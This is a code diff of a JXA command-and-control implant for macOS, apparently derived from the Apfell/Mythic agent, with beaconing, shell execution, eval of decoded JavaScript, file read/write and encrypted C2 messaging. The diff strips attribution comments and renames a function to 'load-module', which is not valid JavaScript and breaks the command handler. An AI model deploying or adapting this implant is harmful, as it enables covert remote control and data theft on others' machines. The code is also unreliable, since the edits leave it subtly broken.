@@ -1,4 +1,3 @@
-// Pulled from https://github.com/its-a-feature/Mythic/blob/master/Payload_Types/apfell/agent_code/base/apfell-jxa.js#L2-L7
 ObjC.import('Cocoa');
 ObjC.import('Foundation');
 ObjC.import('stdlib');
@@ -40,7 +39,6 @@ var sleepTime = "5";
 var newSleep = "%s";
 sleepTime = beacon(newSleep);
 
-// pulled from https://github.com/its-a-feature/Mythic/blob/master/Payload_Types/apfell/agent_code/base/apfell-jxa.js#L9-L30
 // Implant Information (Used to show what user, hostname, IP, etc)
 class agent{
 	constructor(){
@@ -69,12 +67,12 @@ function run_module(m) {
         cmdOutput = error.toString();
     }
     return cmdOutput;
-};
+}
 
-function loadmodule(m){
+function load-module(m){
     s2 = m;
     return "Module Loaded";
-};
+}
 
 function readFile(file) {
     // Convert the file name to a string
@@ -94,9 +92,8 @@ function writeFile(file, data) {
 
     // Read the file using a specific delimiter and return the results
     return "File written";
-};
+}
 
-// pulled from https://github.com/its-a-feature/Mythic/blob/master/Payload_Types/apfell/agent_code/shell.js#L2-L23
 function run_shell(command){
 	//simply run a shell command via doShellScript and return the response
     let response = "";
@@ -115,16 +112,14 @@ function run_shell(command){
 		response = error.toString().replace(/\r/g, "\n");
 		return response;
 	}
-};
+}
 
 function run_jxa(m){
     let jxa = decode(m);
     let cmdOutput = ObjC.deepUnwrap(eval(jxa));
     return cmdOutput;
-};
+}
 
-// partly based on Apfell https://github.com/its-a-feature/Mythic
-// pulled fromhttps://github.com/its-a-feature/Mythic/blob/14b06e3755cea0f291ea6246fc315b9b30388640/Payload_Types/apfell/agent_code/c2_profiles/HTTP.js#L82-L113
 function enc(data){
     // takes in the string we're about to send, encrypts it, and returns a new string
     let err = Ref();
@@ -156,7 +151,7 @@ function enc(data){
     //console.log(final_message.base64EncodedStringWithOptions(0).js);
     return final_message.base64EncodedStringWithOptions(0).js;
 }
-// pulled from https://github.com/its-a-feature/Mythic/blob/master/Payload_Types/apfell/agent_code/c2_profiles/HTTP.js#L115-L132
+
 function dec(nsdata){
     //takes in a base64 encoded string to be decrypted and returned
     let err = Ref();
@@ -175,7 +170,7 @@ function dec(nsdata){
     let decrypted_message = $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
     return decrypted_message;
 }
-// pulled from https://github.com/its-a-feature/Mythic/blob/master/Payload_Types/apfell/agent_code/base/apfell-jxa.js#L106-L115
+
 function decode(data) {
     // base64 decoding
 	if(typeof data == "string"){
@@ -187,7 +182,7 @@ function decode(data) {
 	var decoded_data = $.NSString.alloc.initWithDataEncoding(ns_data, $.NSUTF8StringEncoding).js;
 	return decoded_data;
 }
-// pulled from https://github.com/its-a-feature/Mythic/blob/master/Payload_Types/apfell/agent_code/base/apfell-jxa.js#L116-L124
+
 function encode(data) {
     //base64 encoding
 	if(typeof data == "string"){
@@ -199,7 +194,7 @@ function encode(data) {
 	var encstring = ns_data.base64EncodedStringWithOptions(0).js;
 	return encstring;
 }
-// pulled from https://github.com/its-a-feature/Mythic/blob/master/Payload_Types/apfell/agent_code/base/apfell-jxa.js#L70-L74
+
 convert_to_nsdata = function(strData){
     // helper function to convert UTF8 strings to NSData objects
     var tmpString = $.NSString.alloc.initWithCStringEncoding(strData, $.NSData.NSUnicodeStringEncoding);
@@ -220,7 +215,7 @@ function generateURL() {
 }
 
 function getImgData() {
-    let icoImage = [%s];
+    let icoImage = [%s]
     minNum = 0;
     maxNum = icoImage.length;
     //console.log(maxNum);
@@ -282,9 +277,9 @@ function commander(c) {
             sleepTime = beacon(sleepTime);
             cmdOutput = "Sleep updated to " + c.substring(7,);
         }
-        else if (c.substring(0,10) == "loadmodule") {
+        else if (c.substring(0,10) == "load-module") {
             let m = c.substring(10,);
-            cmdOutput = loadmodule(m);
+            cmdOutput = load-module(m);
           }
         else if (c.substring(0,10) == "run-module") {
             let m = c.substring(11,); 
@@ -340,7 +335,7 @@ while (true) {
     let min = (sleepTime * (1 - jitter));
     let newSleepTime = Math.floor(Math.random() * (max - min) ) + min;
     $.NSThread.sleepForTimeInterval(sleepTime);
-    var urls = [%s]; 
+    var urls = [%s]
     let server = generateURL();
     try {
         var readCommand = getData(server);
